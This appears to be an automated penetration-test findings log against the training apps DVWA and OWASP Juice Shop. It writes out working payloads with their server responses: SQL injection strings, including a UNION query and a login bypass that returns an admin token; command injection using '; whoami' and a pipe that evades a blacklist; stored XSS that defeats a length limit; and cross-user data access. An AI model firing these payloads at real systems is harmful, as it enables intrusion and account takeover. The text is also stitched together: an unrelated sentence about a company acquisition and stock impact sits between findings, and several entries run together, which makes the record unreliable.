findings.title: DVWA SQL Injection (id parameter) at security=low - boolean-based, multiple rows
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 -> HTTP 200, 5 records: 'ID: 1' OR '1'='1 First name: admin Surname: admin'; 'First name: Gordon Surname: Brown'; 'First name: Hack Surname: Me'; 'First name: Pablo Surname: Picasso'; 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2 -> HTTP 200, zero records (only 'User ID:' header with no 'First name/Surname' rows). Surnames recorded: admin, Brown, Me, Picasso, Smith.

findings.title: DVWA OS Command Injection (ip parameter) at security=low
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, security=low)
findings.response_evidence: [security=low] HTTP 200. Ping output (4 packets transmitted, 4 received, 0% packet loss) followed immediately by the line 'www-data' in the <pre> output block, i.e. the output of injected 'whoami' executed by the web process.

findings.title: DVWA Stored XSS via guestbook mtxMessage at security=low
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form txtName=verifier&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook (session dvwa_admin, security=low)
findings.response_evidence: [security=low] POST accepted (HTTP 200); guestbook re-rendered with new entry 'Name: verifier'. The full 52-char canary was stored server-side without truncation: on reload the DOM contains <script id="test_token">window.xss_flag=1</script> (verified via outerHTML). Note: the client-side maxlength=50 was bypassed by submitting the request directly; the server does not enforce the 50-char limit at low.
findings.browser_js_evidence: browser_eval_js("String(window.xss_flag)") -> "1"; browser_eval_js("document.querySelector('script#test_token').outerHTML") -> "<script id=\"test_token\">window.xss_flag=1</script>". Page URL http://dvwa/vulnerabilities/xss_s/ in dvwa_admin session.

findings.title: Login authentication bypass SQL injection via email field (' OR 1=1--)
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT] (token present)","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user admin@juice-sh.op without valid credentials, proving SQL injection in the login email field.

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..."

findings.title: Browsable encryption keys directory exposes premium.key and jwt.pub
findings.response_evidence: HTTP 200 text/html "listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". findings.title: Cross-user basket access (BOLA) on GET /rest/basket/:id
findings.response_evidence: Acct1 (own basket 6) response: {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. Acct2 (own_basket_id=7) requesting /rest/basket/6 received the identical payload: id 6, UserId 22 (Acct1's user), Products[0] name "Apple Juice (1000ml)", BasketItem quantity 3. Acct2 is not the owner of basket 6 and was served Acct1's seeded item and quantity. No authorization check on basket ownership.

findings.title: Unauthenticated feedback listing with author data on GET /api/Feedbacks
findings.response_evidence: Records are returned without authentication (8 records, UserId/id/comment/rating). However, author emails are masked in the comment text, e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)"; anonymous entries show "(anonymous)" with UserId null. No full author email address is disclosed in any record, and no email field exists in the response. Criterion (disclosure of author email addresses) not met; rejected as stated. Partial masked fragments/domain only; may be reconsidered as low-severity information leak if coordinator wishes.

findings.title: SQL injection in product search q parameter on GET /rest/products/search
findings.response_evidence: 1) q=qwert' -> HTTP 500, text: "Error: SQLITE_ERROR: near \"'%'\": syntax error" (SQL error disclosed). 2) Benign q=apple -> HTTP 200, {"status":"success","data":[{id:1,name:"Apple Juice (1000ml)",...},{id:24,name:"Apple Pomace",...}]} with the normal 9 product columns, no error. 3) UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- -> HTTP 200, {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. Injected UNION column values are reflected at the positions of name/description/price/etc., and the original product rows are replaced, proving attacker-controlled SQL in the query. Confirmed via both the SQLITE_ERROR and the UNION reflection, versus the benign baseline.

POST http://dvwa/security.php security=medium&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET /security.php -> 'Security level is currently: medium' / 'Security level set to medium'
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' -> HTTP 200, 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin'; 'First name: Gordon Surname: Brown'; 'First name: Hack Surname: Me'; 'First name: Pablo Surname: Picasso'; 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' -> HTTP 200, no ID/First name/Surname rows (only 'User ID: 1 2 3 4 5' header and footer). Page footer confirmed 'Security Level: medium'. findings.title: OS Command Injection via ip parameter (DVWA Command Injection) [security=high]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> body reports 'Security level is currently: high' (session_info field showed 'low', page body is authoritative)
POST http://dvwa/vulnerabilities/exec/ dvwa_admin form ip=127.0.0.1|whoami&Submit=Submit (payload uses pipe with no trailing space, per high-level blacklist of '; ', '| ', '&&')
Control: POST http://dvwa/vulnerabilities/exec/ dvwa_admin form ip=127.0.0.1&Submit=Submit
findings.response_evidence: [security=high] Level-high test. Security level was NOT changed. Page body reads 'Security level is currently: high' and 'Security Level: high'. Injected request ip=127.0.0.1|whoami returned HTTP 200 with the output block 'Enter an IP address: www-data' (pre_blocks: ['www-data']). Control ip=127.0.0.1 returned only ping output (PING 127.0.0.1 ... 4 packets transmitted, 0% packet loss) with no www-data, so the www-data output is attributable to the injected command. Medium-level test was NOT performed because the coordinator-specified level (medium) was not active and changing it was out of scope.
